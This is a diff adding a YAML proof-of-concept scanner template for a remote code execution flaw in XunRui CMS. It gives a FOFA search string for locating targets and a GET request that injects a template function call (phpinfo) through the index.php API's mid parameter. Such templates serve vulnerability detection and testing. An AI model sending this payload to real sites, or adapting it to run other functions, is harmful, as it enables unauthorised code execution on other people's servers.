@@ -1,0 +1,15 @@
+id: poc-yaml-xunrui-cms-index-rce
+info:
+  name: 迅睿CMS index 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 迅睿CMS
+  fofa: body="欢迎使用迅睿CMS"
+requests:
+- method: GET
+  path: /index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=phpinfo%20param0=-1
+  expression: status_code == 200 && contains(body,"xunruicms") && contains(body,"PHP
+    API") && contains(body,"phpinfo()") && contains(body,`"code":1,"msg":"`)
+variables: {}
+transport: http
